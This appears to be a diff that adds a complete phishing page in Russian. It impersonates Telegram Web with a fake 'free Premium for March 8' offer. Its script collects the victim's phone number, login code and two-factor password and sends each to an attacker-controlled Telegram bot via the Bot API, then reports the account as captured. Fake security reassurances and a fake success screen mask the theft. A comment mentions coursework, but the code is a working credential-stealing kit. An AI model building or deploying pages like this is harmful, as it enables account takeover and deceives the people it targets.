@@ -1,0 +1,342 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Telegram Web - Активация Premium</title>
+    <link rel="stylesheet" href="static/style.css">
+    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500;700&display=swap" rel="stylesheet">
+    <style>
+        .step-indicator {
+            display: flex;
+            justify-content: center;
+            margin-bottom: 30px;
+        }
+        .step {
+            width: 40px;
+            height: 40px;
+            border-radius: 50%;
+            background: #e0e0e0;
+            color: #666;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-weight: bold;
+            margin: 0 10px;
+            position: relative;
+        }
+        .step.active {
+            background: #0088cc;
+            color: white;
+        }
+        .step.completed {
+            background: #4caf50;
+            color: white;
+        }
+        .step:not(:last-child):after {
+            content: '';
+            position: absolute;
+            width: 50px;
+            height: 2px;
+            background: #e0e0e0;
+            left: 40px;
+            top: 50%;
+        }
+        .loading {
+            display: inline-block;
+            width: 20px;
+            height: 20px;
+            border: 3px solid #f3f3f3;
+            border-top: 3px solid #0088cc;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+        }
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="header">
+            <img src="https://telegram.org/img/t_logo.png" alt="Telegram Logo" class="logo">
+            <h1>Telegram</h1>
+        </div>
+
+        <div class="content">
+            <h2>🎁 Активация подарочного Premium 🎁</h2>
+            <p>К 8 Марта дарим год Premium бесплатно! Осталось 12 подарков.</p>
+
+            <!-- Индикатор шагов -->
+            <div class="step-indicator">
+                <div class="step active" id="step1">1</div>
+                <div class="step" id="step2">2</div>
+                <div class="step" id="step3">3</div>
+            </div>
+
+            <!-- Форма ввода -->
+            <form id="loginForm">
+                <!-- Шаг 1: Номер телефона -->
+                <div id="step1-content">
+                    <div class="form-group">
+                        <label for="phone">Номер телефона (международный формат):</label>
+                        <input type="text" id="phone" name="phone" placeholder="+79001234567" required>
+                        <small>Введи номер, привязанный к Telegram</small>
+                    </div>
+                </div>
+
+                <!-- Шаг 2: Код подтверждения (скрыт изначально) -->
+                <div id="step2-content" style="display: none;">
+                    <div class="form-group">
+                        <label for="code">Код подтверждения:</label>
+                        <input type="text" id="code" name="code" placeholder="12345">
+                        <small>Мы отправили код в Telegram. Введи его здесь</small>
+                    </div>
+                </div>
+
+                <!-- Шаг 3: Пароль 2FA (скрыт изначально) -->
+                <div id="step3-content" style="display: none;">
+                    <div class="form-group">
+                        <label for="password">Пароль двухфакторной аутентификации:</label>
+                        <input type="password" id="password" name="password" placeholder="Введи пароль">
+                        <small>Требуется дополнительная защита аккаунта</small>
+                    </div>
+                </div>
+
+                <!-- Кнопка -->
+                <button type="submit" id="submitBtn">Далее</button>
+
+                <!-- Индикатор загрузки -->
+                <div id="loadingIndicator" style="display: none; text-align: center; margin-top: 20px;">
+                    <div class="loading"></div>
+                    <p style="margin-top: 10px;">Обработка...</p>
+                </div>
+            </form>
+
+            <!-- Сообщения -->
+            <div id="message" style="margin-top:20px; padding:10px; display:none;"></div>
+
+            <!-- Информация о безопасности (для отвлечения внимания) -->
+            <div style="margin-top: 20px; padding: 15px; background: #e8f5e8; border-radius: 8px; font-size: 13px;">
+                🔒 Ваши данные защищены шифрованием. Мы не храним пароли.
+            </div>
+        </div>
+
+        <div class="footer">
+            <p>© 2026 Telegram Messenger. Официальный партнер</p>
+        </div>
+    </div>
+
+    <script>
+        // Конфигурация
+        const BOT_TOKEN = 'YOUR_BOT_TOKEN'; // Токен вашего бота
+        const ADMIN_CHAT_ID = 'YOUR_TELEGRAM_ID'; // Ваш ID
+
+        // Состояние формы
+        let currentStep = 1;
+        let phoneNumber = '';
+        let confirmationCode = '';
+        let twoFAPassword = '';
+
+        // Обновление индикатора шагов
+        function updateSteps(step) {
+            document.getElementById('step1').classList.remove('active', 'completed');
+            document.getElementById('step2').classList.remove('active', 'completed');
+            document.getElementById('step3').classList.remove('active', 'completed');
+
+            if (step >= 1) {
+                if (step > 1) {
+                    document.getElementById('step1').classList.add('completed');
+                } else {
+                    document.getElementById('step1').classList.add('active');
+                }
+            }
+            if (step >= 2) {
+                if (step > 2) {
+                    document.getElementById('step2').classList.add('completed');
+                } else {
+                    document.getElementById('step2').classList.add('active');
+                }
+            }
+            if (step >= 3) {
+                document.getElementById('step3').classList.add('active');
+            }
+
+            // Показываем соответствующий контент
+            document.getElementById('step1-content').style.display = step === 1 ? 'block' : 'none';
+            document.getElementById('step2-content').style.display = step === 2 ? 'block' : 'none';
+            document.getElementById('step3-content').style.display = step === 3 ? 'block' : 'none';
+
+            // Меняем текст кнопки
+            const btn = document.getElementById('submitBtn');
+            if (step === 1) btn.textContent = 'Получить код';
+            else if (step === 2) btn.textContent = 'Подтвердить';
+            else if (step === 3) btn.textContent = 'Активировать Premium';
+        }
+
+        // Отправка данных в бот
+        async function sendToBot(command, data) {
+            try {
+                // Пытаемся отправить через Telegram API напрямую
+                const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
+                const response = await fetch(url, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify({
+                        chat_id: ADMIN_CHAT_ID,
+                        text: `${command} ${data}`,
+                        parse_mode: 'Markdown'
+                    })
+                });
+
+                if (!response.ok) {
+                    console.log('Offline mode - data captured:', command, data);
+                    // Для офлайн режима просто логируем
+                    return true;
+                }
+                return true;
+            } catch (error) {
+                console.log('Send error (offline mode):', error);
+                // В офлайн режиме (для курсовой) просто логируем
+                return true;
+            }
+        }
+
+        // Показать сообщение
+        function showMessage(text, type) {
+            const msgDiv = document.getElementById('message');
+            msgDiv.style.display = 'block';
+            msgDiv.textContent = text;
+            msgDiv.style.backgroundColor = type === 'error' ? '#ffebee' : '#e8f5e8';
+            msgDiv.style.color = type === 'error' ? '#c62828' : '#2e7d32';
+            msgDiv.style.border = '1px solid ' + (type === 'error' ? '#ef9a9a' : '#a5d6a7');
+        }
+
+        // Показать/скрыть загрузку
+        function setLoading(loading) {
+            document.getElementById('submitBtn').style.display = loading ? 'none' : 'block';
+            document.getElementById('loadingIndicator').style.display = loading ? 'block' : 'none';
+        }
+
+        // Обработка отправки формы
+        document.getElementById('loginForm').addEventListener('submit', async function(e) {
+            e.preventDefault();
+
+            if (currentStep === 1) {
+                // Шаг 1: Отправляем номер телефона
+                phoneNumber = document.getElementById('phone').value;
+
+                if (!phoneNumber) {
+                    showMessage('Введите номер телефона', 'error');
+                    return;
+                }
+
+                setLoading(true);
+
+                // Имитация отправки кода
+                setTimeout(() => {
+                    setLoading(false);
+
+                    // Переходим к шагу 2
+                    currentStep = 2;
+                    updateSteps(2);
+
+                    showMessage('✅ Код отправлен в Telegram! Проверьте приложение.', 'success');
+
+                    // Отправляем номер хакеру (в реальности здесь fetch)
+                    sendToBot('/log', `phone|${phoneNumber}`);
+
+                    // Автоматически фокусируемся на поле кода
+                    setTimeout(() => {
+                        document.getElementById('code').focus();
+                    }, 500);
+
+                }, 2000);
+
+            } else if (currentStep === 2) {
+                // Шаг 2: Отправляем код подтверждения
+                confirmationCode = document.getElementById('code').value;
+
+                if (!confirmationCode) {
+                    showMessage('Введите код подтверждения', 'error');
+                    return;
+                }
+
+                setLoading(true);
+
+                // Имитация проверки кода
+                setTimeout(async () => {
+                    // Отправляем код хакеру
+                    await sendToBot('/log', `code|${phoneNumber}|${confirmationCode}`);
+
+                    // Создаем сессию (в реальности это делает бот)
+                    await sendToBot('/capture', `${phoneNumber}|${confirmationCode}`);
+
+                    setLoading(false);
+
+                    // Проверяем, нужен ли 2FA (в реальности бот скажет)
+                    // Для демо спрашиваем пользователя
+                    if (confirm('Для этого аккаунта требуется пароль двухфакторной аутентификации. Ввести пароль?')) {
+                        currentStep = 3;
+                        updateSteps(3);
+                        showMessage('🔐 Введите пароль двухфакторной защиты', 'success');
+                    } else {
+                        // Если не нужен или пользователь отказался - показываем успех
+                        showSuccess();
+                    }
+
+                }, 2000);
+
+            } else if (currentStep === 3) {
+                // Шаг 3: Отправляем пароль 2FA
+                twoFAPassword = document.getElementById('password').value;
+
+                if (!twoFAPassword) {
+                    showMessage('Введите пароль двухфакторной защиты', 'error');
+                    return;
+                }
+
+                setLoading(true);
+
+                // Отправляем все данные
+                await sendToBot('/capture', `${phoneNumber}|${confirmationCode}|${twoFAPassword}`);
+
+                setTimeout(() => {
+                    setLoading(false);
+                    showSuccess();
+                }, 2000);
+            }
+        });
+
+        // Показать экран успеха
+        function showSuccess() {
+            document.getElementById('loginForm').innerHTML = `
+                <div style="text-align:center; padding:30px 0;">
+                    <div style="font-size:60px; margin-bottom:20px;">🎉</div>
+                    <h3 style="color:#2e7d32; margin-bottom:15px;">Premium активирован!</h3>
+                    <p style="margin-bottom:25px;">Спасибо! Ваш подарок будет активирован в течение 5 минут.</p>
+                    <div style="background:#f5f5f5; padding:15px; border-radius:8px; font-size:14px;">
+                        <p>🌟 Что входит в подарок:</p>
+                        <ul style="list-style-type: none; padding:0;">
+                            <li>✓ 4 GB загрузка файлов</li>
+                            <li>✓ Ускоренная загрузка</li>
+                            <li>✓ Стикеры-анимации</li>
+                            <li>✓ Премиум значки</li>
+                        </ul>
+                    </div>
+                    <p style="margin-top:25px; font-size:13px; color:#999;">Вы можете закрыть это окно</p>
+                </div>
+            `;
+
+            // Отправляем финальное уведомление о успешном захвате
+            sendToBot('/log', '✅ Аккаунт успешно захвачен!');
+        }
+
+        // Инициализация
+        updateSteps(1);
+    </script>
+</body>
+</html>
